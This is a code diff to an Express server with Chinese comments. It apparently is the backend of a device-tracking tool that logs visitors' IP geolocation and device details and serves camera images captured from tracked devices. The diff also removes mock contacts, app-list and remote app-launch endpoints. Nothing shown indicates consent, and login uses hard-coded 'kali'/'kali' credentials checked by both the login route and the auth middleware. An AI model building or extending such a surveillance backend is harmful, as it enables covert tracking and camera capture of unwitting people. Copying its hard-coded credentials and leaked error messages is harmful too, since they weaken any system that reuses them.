@@ -147,71 +147,45 @@ class Server {
     setupRoutes() {
         // 主页路由
         this.app.get('/', (req, res) => {
-            res.sendFile(path.join(__dirname, '../public/index.html'));
+            res.redirect('/login.html');
         });
 
-        // 监控页面 - 不再需要Basic认证，因为我们有了登录系统
+        // 监控页面路由
         this.app.get('/monitor', (req, res) => {
             res.sendFile(path.join(__dirname, '../public/monitor.html'));
         });
 
-        // 获取所有活跃用户
-        this.app.get('/api/active-users', this.authenticate.bind(this), (req, res) => {
-            const activeUsersData = Array.from(deviceData.entries())
-                .map(([key, data]) => ({
-                    ip: key.split('_')[0],
-                    lastSeen: data.timestamp,
-                    device: data.device,
-                    location: data.location
-                }))
-                .sort((a, b) => new Date(b.lastSeen) - new Date(a.lastSeen));
+        // 登录验证
+        this.app.post('/api/auth', (req, res) => {
+            const { username, password } = req.body;
             
-            res.json(activeUsersData);
+            if (username === 'kali' && password === 'kali') {
+                res.status(200).json({ 
+                    status: 'success',
+                    message: 'Authentication successful'
+                });
+            } else {
+                res.status(401).json({ 
+                    status: 'error',
+                    message: 'Invalid credentials'
+                });
+            }
         });
 
-        // 追踪路由 - 添加详细的错误处理
-        this.app.post('/api/track', async (req, res) => {
+        // 追踪路由 - 添加认证检查
+        this.app.post('/api/track', this.authenticate.bind(this), async (req, res) => {
             try {
                 console.log('Received tracking data:', req.body);
                 let clientIP = req.ip || req.connection.remoteAddress;
                 clientIP = await normalizeIP(clientIP);
                 
-                const userAgent = req.headers['user-agent'];
-                const parser = new UAParser(userAgent);
-                const parsedUA = parser.getResult();
-                const geoData = await getLocationInfo(clientIP);
-
-                // 获取系统信息
-                const deviceInfo = {
-                    model: parsedUA.device.model || parsedUA.os.name || 'Unknown',
-                    os: `${parsedUA.os.name || 'Unknown'} ${parsedUA.os.version || ''}`.trim(),
-                    browser: `${parsedUA.browser.name || 'Unknown'} ${parsedUA.browser.version || ''}`.trim(),
-                    battery: req.body.battery || { level: 0, charging: false },
-                    network: req.body.network || { type: 'Unknown', downlink: 0 },
-                    memory: req.body.memory || {
-                        total: 0,
-                        used: 0,
-                        free: 0
-                    }
-                };
-
                 const data = {
-                    device: deviceInfo,
+                    ...req.body,
                     location: {
-                        lat: geoData.ll?.[0] || 0,
-                        lon: geoData.ll?.[1] || 0,
-                        city: geoData.city,
-                        country: geoData.country,
-                        isp: geoData.org,
+                        ...req.body.location,
                         ip: clientIP
                     },
-                    timestamp: new Date().toISOString(),
-                    lastImage: null,
-                    system: {
-                        cpuUsage: req.body.system?.cpuUsage || 0,
-                        memoryUsage: req.body.system?.memoryUsage || 0,
-                        uptime: req.body.system?.uptime || 0
-                    }
+                    timestamp: new Date().toISOString()
                 };
 
                 await this.saveDeviceData(data);
@@ -227,100 +201,57 @@ class Server {
             }
         });
 
-        // 监控API
+        // 监控API - 添加错误处理
         this.app.get('/api/monitor', this.authenticate.bind(this), async (req, res) => {
             try {
-                const allDevices = Array.from(deviceData.values());
+                const allDevices = Array.from(deviceData.values())
+                    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                 res.json(allDevices);
             } catch (error) {
-                console.error('Error in monitor API:', error);
-                res.status(500).json({ error: 'Internal server error' });
+                console.error('Error in /api/monitor:', error);
+                res.status(500).json({ 
+                    status: 'error',
+                    message: error.message
+                });
             }
         });
 
-        // 获取应用列表
-        this.app.get('/api/apps', this.authenticate.bind(this), async (req, res) => {
-            const clientIP = req.query.ip;
-            const deviceData = this.deviceData.get(clientIP);
-            if (!deviceData) {
-                return res.status(404).json({ error: 'Device not found' });
-            }
-            
-            const mockApps = [
-                { id: 'com.whatsapp', name: 'WhatsApp', icon: '📱' },
-                { id: 'com.facebook', name: 'Facebook', icon: '👥' },
-                { id: 'com.instagram', name: 'Instagram', icon: '📷' },
-                { id: 'com.twitter', name: 'Twitter', icon: '🐦' },
-                { id: 'com.snapchat', name: 'Snapchat', icon: '👻' }
-            ];
-            
-            res.json(mockApps);
-        });
-
-        // 获取通讯录
-        this.app.get('/api/contacts', this.authenticate.bind(this), async (req, res) => {
-            const clientIP = req.query.ip;
-            const deviceData = this.deviceData.get(clientIP);
-            if (!deviceData) {
-                return res.status(404).json({ error: 'Device not found' });
-            }
-            
-            const mockContacts = [
-                { name: '张三', phone: '138****8000', avatar: '👨' },
-                { name: '李四', phone: '139****9000', avatar: '👩' },
-                { name: '王五', phone: '137****7000', avatar: '🧑' }
-            ];
-            
-            res.json(mockContacts);
-        });
-
-        // 启动应用
-        this.app.post('/api/launch-app', this.authenticate.bind(this), async (req, res) => {
-            const { appId } = req.body;
-            const clientIP = req.query.ip;
-            
-            this.log(`尝试启动应用: ${appId} on device: ${clientIP}`);
-            
-            res.json({ status: 'success', message: `已尝试启动应用: ${appId}` });
-        });
-
-        // 处理摄像头图片上传
-        this.app.post('/api/camera-update', upload.single('image'), async (req, res) => {
-            await this.handleCameraUpdate(req, res);
-        });
-
-        // 获取最新的摄像头图片
+        // 摄像头图片API - 添加认证和错误处理
         this.app.get('/api/camera-image/:ip', this.authenticate.bind(this), async (req, res) => {
-            await this.getCameraImage(req, res);
-        });
+            try {
+                const targetIP = req.params.ip;
+                const imageData = imageCache.get(targetIP);
+                
+                if (!imageData || !imageData.buffer) {
+                    return res.status(404).json({
+                        status: 'error',
+                        message: 'No image available'
+                    });
+                }
 
-        // 登录验证
-        this.app.post('/api/auth', (req, res) => {
-            const { username, password } = req.body;
-            
-            if (username === 'kali' && password === 'kali') {
-                res.status(200).json({ message: 'Authentication successful' });
-            } else {
-                res.status(401).json({ message: 'Invalid credentials' });
+                res.set('Content-Type', 'image/jpeg');
+                res.send(imageData.buffer);
+            } catch (error) {
+                console.error('Error serving camera image:', error);
+                res.status(500).json({
+                    status: 'error',
+                    message: 'Error retrieving image'
+                });
             }
         });
     }
 
     authenticate(req, res, next) {
-        // 检查是否有认证头
         const authHeader = req.headers.authorization;
         
-        // 如果没有认证头，检查是否是登录请求
         if (!authHeader) {
-            // 登录API不需要认证
-            if (req.path === '/api/auth') {
-                return next();
-            }
-            return res.status(401).json({ error: 'Unauthorized' });
+            return res.status(401).json({ 
+                status: 'error',
+                message: 'No authorization header'
+            });
         }
 
-        // 验证Basic认证
-        if (authHeader.startsWith('Basic ')) {
+        try {
             const base64Credentials = authHeader.split(' ')[1];
             const credentials = Buffer.from(base64Credentials, 'base64').toString('ascii');
             const [username, password] = credentials.split(':');
@@ -328,9 +259,18 @@ class Server {
             if (username === 'kali' && password === 'kali') {
                 return next();
             }
-        }
 
-        res.status(401).json({ error: 'Invalid credentials' });
+            res.status(401).json({ 
+                status: 'error',
+                message: 'Invalid credentials'
+            });
+        } catch (error) {
+            console.error('Authentication error:', error);
+            res.status(401).json({ 
+                status: 'error',
+                message: 'Invalid authorization header'
+            });
+        }
     }
 
     async saveDeviceData(data) {
